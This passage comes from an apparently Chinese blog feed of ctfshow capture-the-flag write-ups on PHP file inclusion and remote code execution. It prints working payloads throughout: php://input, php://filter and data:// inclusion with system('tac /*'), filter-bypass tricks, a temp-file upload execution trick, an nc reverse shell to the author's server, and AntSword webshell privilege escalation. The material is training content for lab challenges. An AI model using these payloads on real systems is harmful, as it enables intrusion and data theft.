class="line"><span class="comment">//flag in /flag      </span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="string">&quot;nothing.php&quot;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable">$file</span>;      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>题目中已经说了，flag在根目录的flag下<br>我们使用..&#x2F;看根目录就可以读到flag<br>这里的$file &#x3D; $_GET[‘file’]?$_GET[‘file’]:”nothing.php”;<br>是一种三元表达式<br>A?B:C<br>如果A成立返回B，不成立返回C<br>这里和C语言中的三元表达式是相同的</p></blockquote><p><img src="/img/baohan1.jpg" alt="输入图片说明"></p><h4 id="5-http协议"><a href="#5-http协议" class="headerlink" title="5.http协议"></a>5.http协议</h4><p>配合文件包含，可以读取远程的php代码并在本地执行，实现了最终RCE的效果<img src="/img/baohan3.jpg" alt="输入图片说明"></p><h4 id="6-ftp协议"><a href="#6-ftp协议" class="headerlink" title="6.ftp协议"></a>6.ftp协议</h4><p>默认21端口，进行文件传输的协议</p><h4 id="7-php协议-重点）"><a href="#7-php协议-重点）" class="headerlink" title="7.php协议(重点）"></a>7.php协议(重点）</h4><p>php伪协议，伪协议的意思就是，这些协议只能在php中使用，而在其他地方使用不了，不是通用协议</p><p>php:&#x2F;&#x2F;input</p><p>include”php:&#x2F;&#x2F;input” ,include包含的路径就是php:&#x2F;&#x2F;input<br>然后判断有没有带&lt;?php,没带的话就以文本形式输出，带的话就执行里面的php命令，我们用BP传入&#x2F;flag，输出&#x2F;flag而不是&#x2F;flag里面的内容的原因就是这个</p><p>我们不能用hackber直接进行传参，如果不符合正确的格式，hackber会直接给我们丢掉，，在hackber中，传入aabbvv，include“php:&#x2F;&#x2F;input”就什么都读不到，而传入aabbvv&#x3D;123，include“php:&#x2F;&#x2F;input”就能读到aabbvv&#x3D;123</p><p>使用BP的话就可以避免这种情况，我们传入什么BP就读到什么，不会自动给我们丢掉，因此遇见include“php:&#x2F;&#x2F;input”的时候，我们要使用BP进行传参，但是如果我们直接传入，而不带<?php的话，仍会以文本形式直接输出，所以我们应该传入带<?php的php指令，例如<?php system("ls"); ?></p><h4 id="ctfshow私教课web32"><a href="#ctfshow私教课web32" class="headerlink" title="ctfshow私教课web32"></a>ctfshow私教课web32</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="comment">//flag in /flag      </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;php://input&quot;</span>;      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/baohan4.jpg" alt="输入图片说明"></h2><h4 id="ctfshow私教课web33（filter"><a href="#ctfshow私教课web33（filter" class="headerlink" title="ctfshow私教课web33（filter)"></a>ctfshow私教课web33（filter)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="comment">//flag in /flag      </span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];   </span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];      </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;|\&gt;|\;|\(|\?/i&quot;</span>))&#123;   </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;content not safe&quot;</span>);   &#125;      </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>);         </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这里题目的意思是，要求我们传入一个文件名和文件的内容，我们要使用php:&#x2F;&#x2F;filter</p></blockquote><blockquote><p>write是写入，convert.base64-decode是对传入的经过base64编码后的内容进行base64解码，后面的&#x2F;resource&#x3D;1.php，是指将内容写到1.php,然后我们再访问1.php就可以看到指令执行的结果</p></blockquote><blockquote><p>这里传入的content是经过base64编码后的<br><?php system("tac /*");?></p></blockquote><p><img src="/img/baohan5.jpg" alt="输入图片说明"></p><p>然后访问1.php就能拿到flag<img src="/img/baohan6.jpg" alt="输入图片说明"></p><h4 id="ctfshow私教课web34-filter绕过死亡代码"><a href="#ctfshow私教课web34-filter绕过死亡代码" class="headerlink" title="ctfshow私教课web34(filter绕过死亡代码)"></a>ctfshow私教课web34(filter绕过死亡代码)</h4> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="comment">//flag in /flag      </span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];   </span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];         </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$content</span>);         </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><?php die();?><p>是一个死亡代码，到这里时，他会终止php代码的执行，我们可以使用php:&#x2F;&#x2F;filter进行绕过,这里要用凯撒密码</p></blockquote><p><img src="/img/baohan7.jpg" alt="输入图片说明"></p><blockquote><p>content是经过rot13编码后的内容<br>原内容为<?php system("tac /*");?><br>然后我们再访问1.php,就能成功绕过死亡代码，拿到flag<br>string.rot13将传入的内容进行rot13编码，一共就有26个字母，经过两次编码后，就变回了原来的内容<br>原理: 第一次编码后的传入的是没有php标记的，不会被识别为恶意的php代码而死亡，传入后，经过第二次编码变回原来的php恶意代码，从而绕过了死亡代码</p></blockquote><p><img src="/img/baohan8.jpg" alt="输入图片说明"></p><h4 id="ctfshow私教课web35-data协议"><a href="#ctfshow私教课web35-data协议" class="headerlink" title="ctfshow私教课web35(data协议)"></a>ctfshow私教课web35(data协议)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);         </span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;         </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/baohan9.jpg" alt="输入图片说明"></p><blockquote><p>记住data协议的格式<br>&#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,<?php system("tac /*");?><br>data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,<?php system("tac /*");?>可以省略为<br>data:&#x2F;&#x2F;,<?php system("tac /*");?><br>甚至data:,<?php system("tac .*");?></p></blockquote><h3 id="php的文件上传机制"><a href="#php的文件上传机制" class="headerlink" title="php的文件上传机制"></a>php的文件上传机制</h3><p> 我们强制上传文件时，它会自动将我们的文件存放在<br> &#x2F;tmp&#x2F;php??????后面六位是随机的<br> 我们可以用&#x2F;???&#x2F;?????????来找我们强制上传的文件，但是这样的文件有很多，我们可以对最后一位进行缩小范围，根据ascii表我们可以知道@-[,在这个范围内有全部的大写字母，我们可以进一步精确为&#x2F;???&#x2F;????????[@-[],这样当最后以为是大写字母的时候，我们就能抓到我们强制上传的文件，然后我们使用linux下的一个执行符号(.)让我们强制上传的文件执行，所以最终的结构为</p><blockquote><p>.+&#x2F;???&#x2F;????????[@-[]<br>这里的加号代替空格</p></blockquote><h4 id="ctfshow私教课web13-无字母数字命令执行-php强制文件上传"><a href="#ctfshow私教课web13-无字母数字命令执行-php强制文件上传" class="headerlink" title="ctfshow私教课web13 (无字母数字命令执行+php强制文件上传)"></a>ctfshow私教课web13 (无字母数字命令执行+php强制文件上传)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];      </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|[0-9]/i&quot;</span>,<span class="variable">$cmd</span>))&#123;   <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);   </span><br><span class="line">&#125;      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意这里不是远程代码执行，不能使用异或，或，自增，取反进行绕过，我们可以使用强制文件上传</p></blockquote><blockquote><p>首先先构造一个强制文件上传的接口</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://d660c159-574d-4067-9b19-0df274ec82c6.challenges.ctfer.com:8080/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>得到的是这样的一个页面<img src="/img/baohan10.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>然后我们随便构造一个文本<img src="/img/baohan11.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>上传这个文本，使用BP进行抓包</p></blockquote><p><img src="/img/baohan12.jpg" alt="输入图片说明"></p><blockquote><p>在图中画圈处，传上我们构造的强制文件上传和文件里的指令（将文本里的内容改成命令就可以执行了),因为后面六位数是随机的，因此可能不会一下子就匹配到，我们多点几下，能看到的命令执行的结果后停止就行了，这里就可以拿到flag</p></blockquote><hr><p>路漫漫其修远兮，吾将上下而求索。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>rce知识+wp</title>
      <link href="/2025/01/13/rce%E7%9F%A5%E8%AF%86+wp/"/>
      <url>/2025/01/13/rce%E7%9F%A5%E8%AF%86+wp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ctfshow私教课第三节"><a href="#ctfshow私教课第三节" class="headerlink" title="ctfshow私教课第三节"></a>ctfshow私教课第三节</h1><h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><p>Remote Code Exec<br>Code指脚本语言(php)的代码<br>常见函数有</p><ul><li>eval<br>这是字符串，表示将字符串按照php的代码执行</li><li>call_user_func</li><li>call_user_func_array等等</li><li>使用参考PHP7中文手册</li></ul><p>命令执行和代码执行的区别<br>前者执行操作系统的命令 后者执行脚本语言的代码</p><p>函数调用的格式<br>函数返回值 函数名字(函数参数);<br>$ret&#x3D;system(“calc”);</p><h4 id="ctfshow私教课web20"><a href="#ctfshow私教课web20" class="headerlink" title="ctfshow私教课web20"></a>ctfshow私教课web20</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="number">1</span>],<span class="variable">$_POST</span>[<span class="number">2</span>]);      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>经过php7中文手册查到<br>call_user_func — 把第一个参数作为回调函数调用,其余数据是回调函数的参数</p><p> <img src="/img/hanshu0.jpg" alt="输入图片说明"></p><p>eval是语言结构，不是函数，这里不能使用eval<br>?1&#x3D;system   作为回调函数<br>2&#x3D;cat &#x2F;f1agaaa作为回调函数的参数<br>二者结合就可以拿到flag</p><h4 id="ctfshow私教课web21"><a href="#ctfshow私教课web21" class="headerlink" title="ctfshow私教课web21"></a>ctfshow私教课web21</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$_GET</span>[<span class="number">1</span>], <span class="variable">$_POST</span>[<span class="number">1</span>]);      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查阅得到信息<br>array_walk_recursive — 对数组中的每个成员递归地应用用户函数</p><p><img src="/img/hanshu1.jpg" alt="输入图片说明"></p><p>第一个输入一个数组，数组里写函数参数<br>第二个写要执行的回调函数</p><h4 id="ctfshow私教课web22"><a href="#ctfshow私教课web22" class="headerlink" title="ctfshow私教课web22"></a>ctfshow私教课web22</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];      </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|func|array|preg|eval|exec|passthru/i&quot;</span>,<span class="variable">$code</span>))&#123;   <span class="keyword">eval</span>(<span class="variable">$code</span>);   </span><br><span class="line">&#125;         </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用拼接法<br>?1&#x3D;$a&#x3D;sys;$b&#x3D;tem;$c&#x3D;$a.$b;$c($_POST[1]);</p><p>然后运用POST传参<br>1&#x3D;cat &#x2F;f1agaaa<br>就可以拿到flag了</p><h4 id="ctfshow私教课web23"><a href="#ctfshow私教课web23" class="headerlink" title="ctfshow私教课web23"></a>ctfshow私教课web23</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];      </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\?|\;/&quot;</span>,<span class="variable">$code</span>))&#123;   <span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span>.<span class="variable">$code</span>);   </span><br><span class="line">&#125;         </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/pinjie11.jpg" alt="输入图片说明"></p><p>注意题目中有eval(“?&gt;”.$code);<br>这代表php代码已经闭合，如果在后面直接写的话，都会以文本的形式体现<br>所以我们应该自己写一个php代码，但是题目中禁用了?和;  我们只能找其他能使用的<br>在php7中文手册中找到</p><script language="php">开始</script>结束<p>php又有一个性质是，在最后一行代码结尾的;可以省略，所以题目中没有使用;<br>最终转接拿到flag</p><h4 id="ctfshow私教课web24（有反弹shell）"><a href="#ctfshow私教课web24（有反弹shell）" class="headerlink" title="ctfshow私教课web24（有反弹shell）"></a>ctfshow私教课web24（有反弹shell）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];      </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&lt;=<span class="number">13</span>)&#123;   <span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span>.<span class="variable">$code</span>);   </span><br><span class="line">&#125;         </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>第一种方法：不使用转接直接执行命令<br><img src="/img/pinjie5.jpg" alt="输入图片说明"><blockquote><p>这里使用了短标签，也就是<?=它可以替代<?php再者是前面提到的，php代码中有结束?>的话，最后一个;可以省略，如果没有的话，那么;不可以省略</p></blockquote></li></ul><p><img src="/img/pinjie22.jpg" alt="输入图片说明"></p><blockquote><p>再使用*代替f1agaaa拿到flag</p></blockquote><ul><li>第二种方法<br>使用反弹shell的方法<blockquote><p>首先使用VS打开linux的远程服务器,监听3389的端口<br>nc -lvvnp 3389</p></blockquote></li></ul><p><img src="/img/pinjie23.jpg" alt="输入图片说明"></p><blockquote><p>这一段首先删除了<?=短标签的=，导致我们无法看到回显，所以要用到反弹shell注意结束的?>和最后的；必须存在一个<br>这里使用了转接，用2进行<br>nc 服务器公网IP地址 3389 -e &#x2F;bin&#x2F;sh<br>注意-e后面有个空格<br>再点EXECUTE然后使用自己的远程服务器看到回显</p></blockquote><p><img src="/img/fantan0.jpg" alt="输入图片说明"></p><blockquote><p>执行系统命令，我们就可以拿到flag<br><img src="/img/fantan1.jpg" alt="输入图片说明"></p></blockquote><h4 id="ctfshow私教课web25-使用蚁剑）"><a href="#ctfshow私教课web25-使用蚁剑）" class="headerlink" title="ctfshow私教课web25(使用蚁剑）"></a>ctfshow私教课web25(使用蚁剑）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];      </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/include|require|eval/i&quot;</span>,<span class="variable">$code</span>))&#123;   <span class="keyword">eval</span>(<span class="variable">$code</span>);   </span><br><span class="line">&#125;         </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>使用phpinfo()后，我们可以看到它还过滤了一些函数</p></blockquote><p><img src="/img/fantan2.jpg" alt="输入图片说明"></p><blockquote><p>这里禁用的使用拼接法也没办法绕过，我们可是使用蚁剑进行解题</p></blockquote><blockquote><p>这里我们使用转接然后使用蚁剑进行解题<br>题目中禁用了eval，但是我们可以尝试使用不同的解码器进行绕过，base64,chr等等都连接不上<br>这时候我们就要使用其他函数代替eval，这里使用assert，直接使用同样连接不上，但是在使用base64编码或者其他编码后发现可以连接</p></blockquote><p><img src="/img/fantan3.jpg" alt="输入图片说明"></p><blockquote><p>这里我们看不到flag是因为权限不够</p></blockquote><p><img src="/img/fantan4.jpg" alt="输入图片说明"></p><p>我们可以使用蚁剑的虚拟终端，蚁剑能够自动帮帮我们绕过一些禁用，禁止查看，但是仍然会有权限不够的情况，我们可以利用蚁剑上的一些插件进行提权，然后查看flag，这道题不需要提权</p><p><img src="/img/fantan5.jpg" alt="输入图片说明"></p><blockquote></blockquote><p><img src="/img/fantan6.jpg" alt="输入图片说明"></p><h4 id="ctfshow私教课web26-蚁剑-插件）"><a href="#ctfshow私教课web26-蚁剑-插件）" class="headerlink" title="ctfshow私教课web26(蚁剑+插件）"></a>ctfshow私教课web26(蚁剑+插件）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];      </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/include|require|eval/i&quot;</span>,<span class="variable">$code</span>))&#123;   <span class="keyword">eval</span>(<span class="variable">$code</span>);   </span><br><span class="line">&#125;         </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>首先是和web25一样操作在蚁剑上添加数据<br>但是在虚拟终端查找时候，我们发现没有权限查看，我们需要进行提权</p></blockquote><blockquote><p>首先打开这个插件<img src="/img/m0.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>使用第一个，进行提权<img src="/img/m1.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>提权后，我们打开发现插件写入了一个.antproxy.php<img src="/img/m2.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>我们重新连接蚁剑，注意需要改成图中样式<img src="/img/m3.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>连接后，打开虚拟终端，进行简单的绕过，我们就能拿到flag</p></blockquote><p><img src="/img/m4.jpg" alt="输入图片说明"></p><h4 id="ctfshow私教课web27"><a href="#ctfshow私教课web27" class="headerlink" title="ctfshow私教课web27"></a>ctfshow私教课web27</h4><p>题目做法同25.26类似，只是提权用的方式不同</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];      </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/include|require|eval/i&quot;</span>,<span class="variable">$code</span>))&#123;   <span class="keyword">eval</span>(<span class="variable">$code</span>);   </span><br><span class="line">&#125;         </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这里使用和26.27相同的方法放到蚁剑里然后使用工具进行提权，拿到flag<img src="/img/m5.jpg" alt="输入图片说明"></p></blockquote><h4 id="ctfshow私教课web28"><a href="#ctfshow私教课web28" class="headerlink" title="ctfshow私教课web28"></a>ctfshow私教课web28</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];      </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/include|require|eval/i&quot;</span>,<span class="variable">$code</span>))&#123;   <span class="keyword">eval</span>(<span class="variable">$code</span>);   </span><br><span class="line">&#125;         </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>方法和web25.26.27相似，只是使用了另一个提权工具，连接蚁剑方法参考web26.27</p></blockquote><p><img src="/img/m6.jpg" alt="输入图片说明"></p><h4 id="ctfshow私教课web29-无字母数字rce-异或-或-取反"><a href="#ctfshow私教课web29-无字母数字rce-异或-或-取反" class="headerlink" title="ctfshow私教课web29(无字母数字rce,异或+或+取反)"></a>ctfshow私教课web29(无字母数字rce,异或+或+取反)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line"><span 